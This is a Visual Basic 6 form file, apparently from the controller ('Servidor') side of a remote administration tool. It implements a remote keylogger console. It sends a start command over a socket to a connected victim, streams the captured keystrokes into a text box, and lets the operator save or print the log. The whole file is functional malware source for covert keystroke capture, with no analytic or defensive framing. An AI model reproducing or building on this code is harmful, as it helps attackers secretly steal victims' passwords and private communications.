VERSION 5.00
Begin VB.Form FrmKeyLogger 
   Caption         =   "KeyLogger"
   ClientHeight    =   5625
   ClientLeft      =   60
   ClientTop       =   495
   ClientWidth     =   8295
   Icon            =   "FrmKeyLogger.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   5625
   ScaleWidth      =   8295
   StartUpPosition =   3  'Windows Default
   Begin Servidor.ucToolbar ucToolbar1 
      Align           =   1  'Align Top
      Height          =   375
      Left            =   0
      Top             =   0
      Width           =   8295
      _ExtentX        =   14631
      _ExtentY        =   661
   End
   Begin VB.TextBox Text1 
      Height          =   5055
      Left            =   0
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Top             =   480
      Width           =   8175
   End
End
Attribute VB_Name = "FrmKeyLogger"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Public ParentID As Long
Public SocketID As Long
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Const SW_SHOWNORMAL = 1

Public Sub Socket_DataArrival(id As Long, IP As String, Puerto As String, Data As String)
    On Error GoTo ErrHaddle
    
    Text1.Text = Text1.Text & Data
    Text1.SelStart = Len(Text1.Text)
    
ErrHaddle:
End Sub

Public Sub Socket_Close(id As Long, IP As String, Puerto As String)
    Me.Caption = "KeyLogger - Sin Conexión"
    TerminateConnection SocketID
    SocketID = 0
End Sub


Private Sub Form_Load()
    With ucToolbar1

        Call .Initialize(ImageSize:=24, FlatStyle:=True, ListStyle:=True, Divider:=True)
        Call .AddBitmap(LoadResPicture(9, vbResBitmap))
        
        Call .AddButton("Limpiar", 0, "Limpiar")
        Call .AddButton("Guardar", 1, "Guardar")
        Call .AddButton("Imprimir", 2, "Imprimir")
        
        .Tansparent = True
        .UseThemeReBar = True

        Let .Height = .ToolbarHeight * Screen.TwipsPerPixelY
    End With
    WinSock32.SendData SocketID, "0" & Delimiter & END_DATA
    MdlINI.ReadFormPosAndSize Me
End Sub

Private Sub Form_Resize()
    Text1.Move 0, ucToolbar1.Height, Me.ScaleWidth, Me.ScaleHeight - ucToolbar1.Height
End Sub

Private Sub Form_Unload(Cancel As Integer)
    If SocketID Then
        Call WinSock32.SendData(SocketID, "1" & Delimiter & END_DATA)
        TerminateConnection SocketID
        WinSock32.WsClose SocketID
    End If
    MdlINI.SaveFormPosAndSize Me
End Sub



Private Sub ucToolbar1_ButtonClick(ByVal Button As Long)
    On Error GoTo Handler
    Dim sPath As String
    Dim FF As Integer

    Select Case Button
        Case 1
            Text1.Text = vbNullString
        Case 2
            sPath = ShowSaveFile(Me.hwnd, "Log.txt")
            If sPath <> vbNullString Then
                If Dir(sPath) <> vbNullString Then Kill sPath
                FF = FreeFile
                Open sPath For Output As #FF
                    Print #FF, Text1.Text
                Close #FF
            End If
        Case 3
            sPath = Environ("temp") & "\KeyLogger - " & WinSock32.IPAddresses(CStr(SocketID)) & ".txt"
            If Dir(sPath) <> vbNullString Then Kill sPath
            FF = FreeFile
            Open sPath For Output As #FF
                Print #FF, Text1.Text
            Close #FF

            Call ShellExecute(0&, "Print", sPath, ByVal 0&, 0&, SW_SHOWNORMAL)

    End Select
    
    Exit Sub
Handler:
    If FF Then Close #FF
    MsgBox err.Description, vbCritical, "Error " & err.Number
            
End Sub
